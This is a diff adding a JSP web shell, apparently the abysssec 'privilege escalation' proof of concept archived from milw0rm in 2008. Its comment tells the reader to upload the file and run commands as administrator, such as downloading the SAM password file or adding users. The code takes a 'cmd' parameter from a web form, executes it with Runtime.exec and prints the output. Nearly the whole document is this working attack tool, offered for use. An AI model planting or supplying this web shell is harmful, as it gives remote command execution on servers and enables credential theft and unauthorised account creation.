@@ -1,0 +1,40 @@
+<%@ page import="java.util.*,java.io.*"%>
+<%
+%>
+ 
+<%--
+abysssec inc public material
+ 
+just upload this file with abysssec.jsp and execute your command
+your command will run as administrator . you can download sam file
+add user or do anything you want .
+note : please be gentle and don't obstructionism .
+vulnerability discovered by : abysssec.com
+ 
+ --%>
+<HTML><BODY bgcolor=#0000000 and text=#DO0000>
+<title> Abysssec inc (abysssec.com) JSP vulnerability </tile>
+<center><h3>JSP Privilege Escalation Vulnerability PoC</center></h3>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Execute !">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+
+# milw0rm.com [2008-11-28]
